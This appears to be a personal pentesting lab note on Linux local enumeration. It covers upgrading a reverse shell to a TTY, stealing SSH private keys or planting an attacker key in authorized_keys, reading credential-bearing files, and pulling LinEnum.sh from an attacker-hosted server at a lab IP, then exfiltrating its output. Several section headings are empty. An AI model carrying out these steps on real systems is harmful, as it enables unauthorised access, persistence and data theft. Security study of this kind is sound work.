# Linux: Local Enumeration  

## TTY

A netcat reverse shell can be easily broken by simple mistakes.
In order to fix this, we need to get a 'normal' shell, aka tty (text terminal). 
Note: Mainly, we want to upgrade to tty because commands like su and sudo require a proper terminal to run.

### Python Shell Upgrade 

python3 -c 'import pty; pty.spawn("/bin/bash")'

Generally speaking, you want to use an external tool to execute /bin/bash for you.  
Try everything you know, starting from python, finishing with getting a binary on the target system. 

### Upgrading Resources

[List of static binaries you can get on the system](https://github.com/andrew-d/static-binaries)

[Upgrading to TTY:](blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)

## SSH

`id_rsa` contains a private key that can be used to connect to a box via ssh.  
usually located in the `.ssh` folder in the user's home folder. (Full path: `/home/user/.ssh/id_rsa`)  
Get that file on your system and give it read/write-only permissions for your user:
`:> chmod 600 id_rsa` and connect by executing `:> ssh -i id_rsa user@ip`.

In case if the target box does not have a generated id_rsa file (or you simply don't have reading permissions for it), you can still gain stable ssh access.  
Generate your own id_rsa key on your system and include an associated key into authorized_keys file on the target machine.  

Execute `:> ssh-keygen` and you should see `id_rsa` and `id_rsa.pub` files appear in your own .ssh folder.  
Copy the content of the id_rsa.pub file and put it inside the `authorized_keys` file on the target machine (located in .ssh folder).  
After that, connect to the machine using your id_rsa file.  

## Basic Enumeration

### Query the System

`:> hostname` : Query the hostname  

`:> uname -a`  : Query Kernel information  

`:> cat /etc/passwd`  :  Identify system users  

`:> cat /etc/shells` : Identify potentially useful shells on the system

`:> cat /etc/crontab` : List cron jobs

`:> cat /proc/version` : Specifics about the kern verion and the GCC compilers use to build the kernel  

`:> cat /etc/issue` : Contains the pre-login prompt and can be changed  

`:> env` : Display environment variables  

`:> id` : overview of user's privileges; providing another username as an argument can reveal priviileges of that user

`:> history` : information about the target system and limited information on potentially captured usernames and passwords

### LinEnum.sh to Exfiltrate comprehensive system information

Get LinEnum.sh onto the attacking device

`:> wget -O LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh`

Gain access to the target machine

![Logged In](assets/Linux-PrivEsc-01-LinEnum-01.png)

Open a simple server on the attacking device in the directory from where LinEnum can be transported.

`:> python3 -m http.server 8888`

![Python Server](assets/Linux-PrivEsc-01-LinEnum-02.png)  

On the target device, set up a location from where the script will run.  

![Target Locationls](assets/Linux-PrivEsc-01-LinEnum-03.png)  

Pull the script from the python server to the target device.  

`:> wget 10.201.47.243:8888/LinEnum.sh`

The serving attacker logs the "GET" request and the target device recevies the script

![wget LinEnum](assets/Linux-PrivEsc-01-LinEnum-04a.png)  

If the target device is permitted a WAN connection, pull the script from GitHub.

`:> wget -O LinEnumFromGit.sh https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh`  

Add execution privileges to the script 

`:> chmod +x LinEnum.py`

![with exeuction](assets/Linux-PrivEsc-01-LinEnum-05.png)  

Run the script and output to a file that can be studied for escalation opportunities

`:> ./LinEnum.sh > enum.txt`

Shutdown the server on the attacking device

![Server Shutdown](assets/Linux-PrivEsc-01-LinEnum-06.png)  

Reverse the server setup and transfer the enum.txt to the attacking device for analysis and resource development.

![Data Exfiltration](assets/Linux-PrivEsc-01-LinEnum-07.png)

## /etc

## Find Command and Interesting files  

## SUID

## Port Forwarding

## Automating Scripts